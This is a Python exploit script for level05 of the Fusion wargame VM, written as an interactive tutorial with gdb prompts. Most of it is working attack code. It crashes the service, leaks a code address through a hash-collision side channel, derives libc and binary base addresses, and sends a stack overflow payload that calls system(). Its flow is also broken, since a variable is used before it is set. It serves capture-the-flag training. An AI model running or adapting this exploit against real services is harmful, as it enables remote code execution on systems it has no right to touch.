#!/usr/bin/python
import struct
import sys
import core
import time
import base64 as b64
import signal
import socket

####################################################
#               HELPER FUNCTIONS
####################################################
def clear_all_regs(fd, clearuntil=128):
    for i in range(clearuntil):
        addreg(fd, "", 0x00, "0.0.0.0", regindex=i)

def crash_l05(fd):
    checkname(fd, "A"*48)

def l05_hash(data, mask=0x7F):
    #Forcing 32b arith by &0xFFFFFFFF
    h = 0xfee13117
    h &= 0xFFFFFFFF
    for ch in data:
        h ^= ord(ch)
        h &= 0xFFFFFFFF
        h += h<<11
        h &= 0xFFFFFFFF
        h ^= h>>7
        h &= 0xFFFFFFFF
        h -= ord(ch)
        h &= 0xFFFFFFFF
    h += h<<3
    h &= 0xFFFFFFFF
    h ^= h>>10
    h &= 0xFFFFFFFF
    h += h<<15
    h &= 0xFFFFFFFF
    h -= h>>17
    h &= 0xFFFFFFFF
    return h & mask

def checkrecord(fd, payload):
    for _ in range(255):
        addreg(fd['addreg'], "A", 0xE0, "{0}.{0}.{0}.{0}".format(_), regindex=_)
        #Trash
        checkname(fd['checkname'], "B"*len(payload) + "\x00") 

        if checkname(fd['checkname'], payload + "\x00"):
            matchindex = _
            break
    return matchindex

def gen_candidates(payload, extrabytes, matchidx):
    candidates = []
    for i in range(255):
        if l05_hash(payload + struct.pack("B", i) + extrabytes+"\x04") == matchidx:
            #print "checkname<+117> = "+str(hex(i))
            candidates.append(i)
    return candidates


def extract_byte(fd, lenpayload, extrabytes):
    candidates = []

    payload = "A"*lenpayload
    matchidx = checkrecord(fd, payload)
    print "Index (A): {0}".format(matchidx)
    candidates += gen_candidates(payload, extrabytes, matchidx)

    clear_all_regs(fd['addreg'], matchidx+1)

    payload = "B"*lenpayload
    matchidx = checkrecord(fd, payload)
    print "Index (B): {0}".format(matchidx)
    candidates += gen_candidates(payload, extrabytes, matchidx)

    clear_all_regs(fd['addreg'], matchidx+1)

    payload = "C"*lenpayload
    matchidx = checkrecord(fd, payload)
    print "Index (C): {0}".format(matchidx)
    candidates += gen_candidates(payload, extrabytes, matchidx)

    clear_all_regs(fd['addreg'], matchidx+1)

    payload = "D"*lenpayload
    matchidx = checkrecord(fd, payload)
    print "Index (D): {0}".format(matchidx)
    candidates += gen_candidates(payload, extrabytes, matchidx)

    clear_all_regs(fd['addreg'], matchidx+1)

    print candidates
    if len(candidates) > 1:
        return [i for i in candidates if candidates.count(i) > 1][0]
    else:
        return candidates[0]

####################################################
#               EXERCISE LEVEL05
####################################################
def isup(fd):
    return True

def quit(fd):
    fd.send("quit")
    return True

def checkname(fd, name):
    time.sleep(.1)
    cmd = "checkname"
    buf = " ".join([cmd, str(name)])
    fd.send(buf)
    rxdata = fd.recv(1024)
    #print rxdata
    return True if rxdata.endswith("is indexed already\n") else False

def senddb(fd, ip, port):
    time.sleep(.1)
    cmd = "senddb"
    buf = " ".join([cmd, str(ip), str(port), "\r\n\x00"])
    fd.send(buf)
    return True

def addreg(fd, name, flags, ip, regindex=None):
    time.sleep(.1)
    if regindex is not None:
        for i in xrange(sys.maxint):
            if l05_hash(str(i)) == regindex:
                name=str(i)
                break
        #print "Updating NAME=\"{0}\" to hit REG[{1}]".format(name, regindex)

    #The null-term after str(ip) was a bitch
    cmd = "addreg"
    buf = " ".join([cmd, str(name), str(int(flags)), str(ip)+"\x00"])
    fd.send(buf)
    return True #Printf appears to not route over socket!

def main(ip, port):
    msg = "The first thing we're going to do is crash level05 " \
          "in the fusion VM.  We're doing this because we need "\
          "stacks to be reset to a known state."
    print msg
    fd = core.attach(ip, port, wait=False)
    print core.rx_until(fd, "\n") #Welcome to level05

    #crash the program first!l
    crash_l05(fd)
    fd.close()
    print "* Level05 crashed & reset"



    #Senddb has an overflow-vuln (line 103)
    #Use 'nc -lu -p 1337' to monitor the UDP output
    #senddb(fd, "192.168.136.100", 1337)

    #free(0xb95c4850) - twice, but cheated to obtain
    #is this address leaked anywhere?

    #segfault @ 0x41414141
    #vuln in for loop in get_and_hash
    #checkname(fd, "A"*48)

    msg = "We're going to form two connections to level05 now. "\
          "Thanks to libtask, each connection has its own stack, "\
          "so we don't need to worry about different commands "\
          "altering the layout of our target stack.  We are going "\
          "to create a socket for CHECKNAME and ADDREG commands."
    print msg
    raw_input("Press ENTER plz")
    fd = {'checkname':core.attach(ip, port, wait=False), 'addreg':core.attach(ip, port, wait=True)}
    print core.rx_until(fd['checkname'], "\n") #Welcome to level05
    print core.rx_until(fd['addreg'], "\n") #Welcome to level05

    # Test clearing regs
    # x/6xb registrations
    #addreg(fd['addreg'], "", 0xE0, "255.255.255.255", 0)
    #raw_input("press key")
    #addreg(fd['addreg'], "", 0xE0, "0.0.0.0", 0)
    #raw_input("Clear all regs...")
    #clear_all_regs(fd['addreg'], 2)
    #return

    msg = "Now that you've attached gdb to level05, take a look "\
          "at a few things, and set a breakpoint\n"\
          "1 -  (gdb) p checkname+117 #Note the address of checkname+117\n"\
          "2a - (gdb) x/6xb registrations #registrations[0]\n"\
          "2b - (gdb) ptype registrations #Registrations struct\n"\
          "3  - (gdb) b *(get_and_hash+134) #View the checkname buffer\n\n"\
          "Go ahead and continue from here."
    print msg
    raw_input("Press ENTER plz")

    msg = "The behavior of the program's stack seems to be predictable.\n"\
          "The program is about to break on get_and_hash's call to hash. "\
          "Take a look at the buffer that's being passed in:\n"\
          " (gdb) x/12xw *(int*)$esp\n"\
          "Try modifying the script with a few more checkname calls. "\
          "Don't forget to null terminate your inputs. Examine the "\
          "buffers using the gdb command above."
    print msg
    raw_input("Press ENTER plz")

    #Trash
    msg = "The first thing we're going to do with level05 is bring "\
          "the stack into a known state.  This involves sending it a "\
          "checkname request with some dummy data in it.  GDB will "\
          "break just before the call to hash().  Take a look at the "\
          "being passed in.  There's nothing useful this time around. "\
          "That changes on the next call."
    print msg
    raw_input("Press ENTER plz")
    checkname(fd['checkname'], "CCCC\x00") 
    #raw_input("set bp @ get_and_hash+134...")

    msg = "Okay, this is where the magic happens. If you were to "\
          "run checkname a few more times, you'd see TWO stack layouts "\
          "alternate in the buffer to hash().  The first one should "\
          "have a bunch of other stack locations on it.  It's not "\
          "very useful.  The second one looks something like this:\n"\
          " (gdb) x/12xw *(int*)$esp\n"\
          "<4b useless> <4b useless> <4b useless> <checkname117>\n"\
          "<0x00000004>\n"\
          "Our goal is to get the address of CHECKNAME+117.  We want "\
          "that so we can find the load address of the binary, and "\
          "therefore libc's load address.  For some reason, the offset "\
          "between the two has remained constant\n"\
          "By writing a total of 15 bytes in our checkname buffer, "\
          "we're going to see hash's buffer look something like this:\n"\
          "  0x41 0x41 0x41 0x41\n"\
          "  0x41 0x41 0x41 0x41\n"\
          "  0x41 0x41 0x41 0x41\n"\
          "  0x41 0x41 0x41 0xYY where YY is the MSB of checkname117\n"\
          "  0x04 0x00 0x00 0x00 where 04 remains constant (FD?)\n"\
          "So this string: AAAAAAAAAAAAAAAA?\\x04 is going to get passed "\
          "into hash() now."
    print msg
    raw_input("Press ENTER plz")

    msg = "HASH is going to do some shitty shifts and lame xors and "\
          "generate a number between 0 and 127.  CHECKNAME is going to "\
          "see if a REGISTRATION entry has been created at that index. "\
          "CHECKNAME will send a string back to us that ends with "\
          "IS INDEXED ALREADY or IS NOT INDEXED ALREADY.  Using that "\
          "information, we can keep adding REGISTRATION structures via "\
          "ADDREG, and checking to see if we get a hit.\n\n"\
          "Upon getting a hit, we can brute force the hash function to "\
          "identify the unknown byte, which will be from CHECKNAME117. "\
          "I use a few different bytes as my payload buffer because their "\
          "hash function sucks, and collides a lot.  Different payloads "\
          "allow me to see which unknown bytes from checkname117 show up "\
          "more than once, raising their likelihood of being the "\
          "correct byte.\n\nHere we go."
    print msg
    raw_input("Press ENTER plz and find the checkname+117 addr")
    gdb = 'p checkname+117'
    checkname117 = int(checkname117, 16)
    libc_system = checkname117 - 0x16ed15
    bin_base = checkname117 - 0x27c0 - 117l
    id_str = bin_base + 0x69c + 4 # an 'id' str to have system execute


    # executes /bin/bash on new process at leastl
    checkname(fd['checkname'], 'A'*44 + struct.pack("<I", libc_system) + struct.pack("<I", id_str))





    b3 = extract_byte(fd, 15, "")
    print hex(b3)
    clear_all_regs(fd['addreg'])

    b2 = extract_byte(fd, 14, struct.pack("B", b3))
    print hex(b2)

    b1 = extract_byte(fd, 13, struct.pack("BB", b2, b3))
    print hex(b1)

    b0 = extract_byte(fd, 12, struct.pack("BBB", b1, b2, b3))
    print hex(b0)

    checkname117 = "0x"
    checkname117 += str(hex(b3))[-2:]
    checkname117 += str(hex(b2))[-2:]
    checkname117 += str(hex(b1))[-2:]
    checkname117 += str(hex(b0))[-2:]

    print "checkname <+117> @ " + checkname117
    print "libc load offset appears to be checkname117-0x194c55"

    print "Complete"

if __name__ == "__main__":
    if len(sys.argv) > 2:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    else:
        print "Assigning default IP/PORT"
        ip = "192.168.1.145"
        port = 20005
    main(ip, port)

